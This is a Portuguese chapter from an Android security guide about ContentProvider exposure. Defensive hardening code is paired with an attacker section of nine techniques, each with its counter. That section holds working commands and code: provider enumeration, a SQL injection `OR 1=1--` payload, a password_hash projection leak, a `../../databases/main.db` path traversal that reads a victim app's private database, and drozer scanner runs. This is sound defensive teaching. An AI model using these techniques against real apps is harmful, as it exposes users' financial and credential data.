# 16 — Explorando content providers

> "Um `ContentProvider` é um banco de dados publicamente chamável sem balcão de recepção. O
> trabalho do defensor é lembrar que ele existe." — *Fortress field notes*

**TL;DR** — `ContentProvider` é o mecanismo de IPC do Android para compartilhar dados
estruturados entre apps. Também é a superfície de IPC mais sobreexposta no ecossistema:
defaults inclinaram para "exported" até SDK 17, e mesmo depois disso, blocos
`<grant-uri-permission>` bem intencionados e paths estilo `openFile` vazam. O playbook do
atacante é enumerar providers exportados, probar SQL injection em `query`, path traversal em
`openFile`, e confusão de authority em `grant-uri-permission`. A resposta do defensor:
**não exporte**, e se tiver que exportar, **valide todo argumento como se fosse uma
requisição de API remota — porque é**.

| | 🛡️ Defensor | ⚔️ Atacante |
|---|---|---|
| **Objetivo** | Tratar toda chamada a provider exportado como input não confiável | Enumerar providers, achar um sem permissão de auth, queryar |
| **Ideia central** | `android:exported="false"` por padrão; permissões no resto | Se `pm dump` revela e `content query` devolve rows, é meu |
| **Pior falha** | Um provider exportado com SQL concatenada na cláusula WHERE | Um provider exportado que abre arquivos do usuário via path traversal |

---

## 🛡️ Defensor — "Se eu não preciso exportar, não exporto"

### O default melhorou, mas ainda é load-bearing

Desde Android 4.2 (API 17), `android:exported` default para **false** quando o provider não
tem intent filter. Código mais velho, bibliotecas terceiras e integrações de SDK copy-pasted
frequentemente ignoram isso e setam `android:exported="true"` "por via das dúvidas",
deixando a porta aberta.

```xml
<!-- Ruim — todo app no device pode chamar isso -->
<provider
    android:name=".SettingsProvider"
    android:authorities="com.umain.fortress.settings"
    android:exported="true" />

<!-- Melhor — só callers que têm nossa permissão custom -->
<provider
    android:name=".SettingsProvider"
    android:authorities="com.umain.fortress.settings"
    android:exported="true"
    android:permission="com.umain.fortress.permission.READ_SETTINGS" />

<!-- Melhor ainda — não exportado de jeito nenhum (o único default sano para estado privado do app) -->
<provider
    android:name=".SettingsProvider"
    android:authorities="com.umain.fortress.settings"
    android:exported="false" />
```

O manifest do Fortress exporta **zero** providers. O estado da sessão vive em DataStore
(privado do sandbox do app), o vault encriptado de tokens vive no Keystore
(mediado pelo kernel). Não há superfície de IPC para um atacante enumerar.

### Se tiver que exportar, valide como se fosse API pública

```kotlin
class SettingsProvider : ContentProvider() {

    override fun query(
        uri: Uri,
        projection: Array<String>?,
        selection: String?,
        selectionArgs: Array<String>?,
        sortOrder: String?,
    ): Cursor? {
        // 1. Bata o URI exatamente com uma tabela conhecida — recuse qualquer outra coisa.
        val table = MATCHER.match(uri)
        if (table == UriMatcher.NO_MATCH) return null

        // 2. Recuse seleções fornecidas pelo caller; use uma projection / WHERE fixos.
        //    Se o caller pode variar a cláusula WHERE, você tem SQL injection por design.
        val fixedSelection = when (table) {
            TABLE_USER_PROFILE -> "user_id = ?"
            else -> return null
        }

        // 3. Limite a projection — nunca ecoe a lista de colunas do caller.
        val safeProjection = ALLOWED_USER_PROFILE_COLUMNS

        // 4. Autorize. Se usamos uma permissão, temos auth no nível UID via plataforma;
        //    adicione checagens mais granulares para rows sensíveis.
        val callingUid = Binder.getCallingUid()
        if (!isAllowedToReadProfile(callingUid)) return null

        return db.query(USER_PROFILE_TABLE, safeProjection, fixedSelection,
            selectionArgs?.take(1)?.toTypedArray(), null, null, sortOrder)
    }
}
```

As três coisas que dão errado de outra forma:

1. **`selection`/`selectionArgs` do caller** ficam concatenados como string na cláusula WHERE.
   SQL injection. Sempre use placeholders `?`, e **não deixe o caller ditar o shape da
   cláusula WHERE** — predefina.
2. **`projection` do caller** vaza rows que o caller não devia ver. Sempre projete para uma
   allowlist fixa.
3. **Lookups de `uri`** sem `UriMatcher` aceitam qualquer path que o caller passa. Parsing
   de `Uri` historicamente tem surpresas com segmentos `..`, chars double-encoded, e
   trailing slashes.

### `openFile` e a armadilha de path traversal

```kotlin
// PERIGOSO
override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
    val name = uri.lastPathSegment  // atacante controla isso
    val file = File(context!!.filesDir, name)
    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.parseMode(mode))
}

// Se o atacante passa um URI terminando em "../../../../data/data/com.umain.fortress/databases/main.db",
// o File resultante é SEU database privado. O Provider acabou de exfiltrar.
```

Mitigação do defensor:

```kotlin
override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
    val expectedBase = File(context!!.filesDir, "public_exports").canonicalFile
    val requestedRelative = uri.lastPathSegment ?: return null
    val resolved = File(expectedBase, requestedRelative).canonicalFile
    // O path canônico resolvido tem que ainda ser um *filho* de expectedBase.
    if (!resolved.path.startsWith(expectedBase.path + File.separator)) return null
    return ParcelFileDescriptor.open(resolved, ParcelFileDescriptor.parseMode(mode))
}
```

`canonicalFile` resolve `..` e symlinks. O check startsWith confirma que o resultado ainda
está dentro do diretório esperado.

### Modelos de permissão

Três camadas, da mais fraca à mais forte:

1. **`android:exported="true"` só** — todo app no device consegue chamar.
2. **`android:permission="…"`** — só apps com a permissão declarada. Granular mas ainda
   grosso (uma permissão para o provider inteiro).
3. **Permissões por row / por URI** via `<grant-uri-permission>` e
   `FLAG_GRANT_READ_URI_PERMISSION` — app-caller pega acesso temporário e escopado (o modelo
   que o FileProvider usa).

Para a feature hipotética "compartilhar uma transação como PDF" do Fortress: nunca exponha o
arquivo via um provider exportado. Use **FileProvider** + `FLAG_GRANT_READ_URI_PERMISSION`
para conceder um URI específico a um app específico para uma única intent dispatch, depois
revogue.

### Descobrindo sua própria exposição

```bash
# Todo provider exportado por todo app no device.
adb shell pm list packages -f | cut -d= -f2 | while read pkg; do
  adb shell dumpsys package "$pkg" | grep -A 1 'Provider'
done

# Ou para um app só:
adb shell dumpsys package com.umain.fortress | grep -A 6 'Provider:'
```

Rode isso contra suas próprias release builds como check de CI. Se um provider que você não
queria exportar aparece — falhe a build.

### O grep de path-traversal

```bash
# No CI, falhe se openFile pega uri.lastPathSegment sem canonicalização.
grep -nR --include='*.kt' 'uri.lastPathSegment' app/src/ \
  | grep -iv 'canonicalFile\|startsWith'
```

Cru mas pega o shape mais comum do bug.

### Logando entry points de IPC

Logue toda chamada `query`, `insert`, `update`, `delete`, `openFile` com
`Binder.getCallingUid()`, o URI e a contagem de rows devolvidas. Em produção, os logs vão
para sua analytics; um spike anômalo de hits ao provider de um único UID é sinal de fraude.

---

## ⚔️ Atacante — "Eu enumero, probo, exfiltro"

### Bypass 1 — Enumerar providers exportados

```bash
# No device alvo (meu, com o app vítima instalado):
$ adb shell dumpsys package com.victim.bank | grep -A 6 'Provider:'

  Provider{abc123 com.victim.bank/.AccountsProvider}
    authority=com.victim.bank.accounts
    exported=true
    ...
```

Agora eu tenho a authority e a superfície. Hora de probar.

### Bypass 2 — `content query` contra a authority descoberta

```bash
$ adb shell content query --uri content://com.victim.bank.accounts/profile
Row: 0 _id=1, balance=12453.00, email=alice@victim.bank, full_iban=SE45...
```

Se o provider está exportado sem permissão, **eu acabei de dumpar o perfil do usuário a
partir de um app malicioso instalado ao lado**. Sem precisar de root.

**Counter:** o ponto inteiro de "não exporte" ou "exija permissão".

### Bypass 3 — SQL injection em selection

```bash
$ adb shell content query --uri content://com.victim.bank.accounts/profile \
    --where "user_id = '1' OR 1=1--"
```

Se o provider faz `db.query(table, projection, "user_id = " + selection, …)`, o `--` comenta
o resto e `1=1` bate em toda row.

**Counter:** queries parametrizadas com `selectionArgs`, strings de `selection` fixas, nunca
concatene input do caller.

### Bypass 4 — Vazamento por projection

```bash
$ adb shell content query --uri content://com.victim.bank.accounts/profile \
    --projection "password_hash"
```

Se o provider passa `projection` sem alteração, o caller escolheu a coluna. Bônus: alguns
providers devolvem `null` para projections desconhecidas — o atacante itera no schema
tentando projections até pegar uma resposta não-null.

**Counter:** projection fixa por rota. Trate a projection do caller como um *pedido* a ser
validado contra uma allowlist específica da rota.

### Bypass 5 — Path traversal via `openFile`

```bash
$ adb shell content read --uri "content://com.victim.bank.exports/files/../../databases/main.db"
$ # Ou via código Java do meu app malicioso:
val pfd = contentResolver.openFileDescriptor(
    Uri.parse("content://com.victim.bank.exports/files/../../databases/main.db"),
    "r",
)
val stream = FileInputStream(pfd.fileDescriptor)
// Leia o DB privado da vítima, mande pro meu servidor.
```

O `openFile` do provider resolve `files/../../databases/main.db` relativo a `filesDir`,
termina em `data/data/com.victim.bank/databases/main.db`, abre. O pfd voa pela fronteira do
Binder; meu app lê o database que nunca devia ter saído do sandbox.

**Counter:** o check `canonicalFile + startsWith` mostrado acima.

### Bypass 6 — Confusão de authority de URI

Se o provider declara `authority="com.victim.bank.exports"` mas o código de roteamento olha
só `uri.path` (ignorando authority), eu mando
`content://com.victim.bank.exports/exports/../../sensitive/file` — a checagem de authority
passa, o path traversal funciona.

**Counter:** valide o URI *inteiro* estruturalmente, não por padrão de string. Use
`UriMatcher` exclusivamente.

### Bypass 7 — Race do grant de permissão

`FLAG_GRANT_READ_URI_PERMISSION` é suposto ser temporário. Se o issuer não revoga, eu mantenho
a permissão através de reinstalações do meu app malicioso — uma vez concedido, a tabela
AOSP de permissões persiste até revogada ou o app issuer ser desinstalado.

**Counter:** chame `revokeUriPermission` quando o grant não for mais necessário. Atrele a
vida do grant a uma intent dispatch específica, não à vida da sessão issuer.

### Bypass 8 — Use um provider não-exportado de um atacante no mesmo processo

Se eu tenho código no seu processo (Frida, SDK malicioso), `android:exported="false"` não
importa — callers do mesmo processo não precisam da camada de IPC. Métodos do provider são
só métodos Kotlin que eu posso chamar.

**Counter:**
- Mesma resposta dos capítulos de RASP / decompile: não tenha código no seu processo. Se
  você tem, o provider não é seu elo mais fraco de qualquer jeito.
- Dados sensíveis em `ContentProvider` são fundamentalmente mais fracos que dados sensíveis
  numa chave Keystore TEE-bound. Use o Keystore para secrets de verdade; use providers só
  para dados shareable.

### Bypass 9 — Drozer / fuzzing automatizado de provider

`drozer` (anteriormente Mercury) automatiza o acima:

```bash
$ drozer console connect
dz> run app.provider.info -a com.victim.bank
dz> run app.provider.query content://com.victim.bank.accounts/profile
dz> run scanner.provider.injection -a com.victim.bank
dz> run scanner.provider.traversal -a com.victim.bank
```

Vinte minutos, sem habilidade necessária.

**Counter:** os mesmos checks de CI que pegam misuse hand-written. Rode os scanners do
drozer no seu próprio CI contra release candidates.

---

## Cross-reference

- **Não ponha secrets em providers — use a TEE** → [02-hardware-vault.md](02-hardware-vault.md)
- **Enumeração via APK que o atacante usa para achar seus providers** → [12-decompiling.md](12-decompiling.md)
- **Atacantes em processo que bypassam permissões de provider inteiramente** → [14-rasp-strategies.md](14-rasp-strategies.md)
- **Higiene em nível de app que complementa hardening de provider** → `AndroidManifest.xml`: `android:allowBackup="false"`, `android:dataExtractionRules`

## Referências

- [Exploiting Content Providers in Android Applications](https://redfoxsecurity.medium.com/exploiting-content-providers-in-android-applications-a75cbda2a5c7)
- [Android Developers — ContentProvider](https://developer.android.com/guide/topics/providers/content-providers)
- [Android Developers — UriMatcher](https://developer.android.com/reference/android/content/UriMatcher)
- [Android Developers — FileProvider](https://developer.android.com/reference/androidx/core/content/FileProvider)
- [OWASP MASVS — MSTG-PLATFORM-4 / MSTG-PLATFORM-5](https://mas.owasp.org/MASVS/)
- [Drozer security assessment framework](https://github.com/WithSecureLabs/drozer)
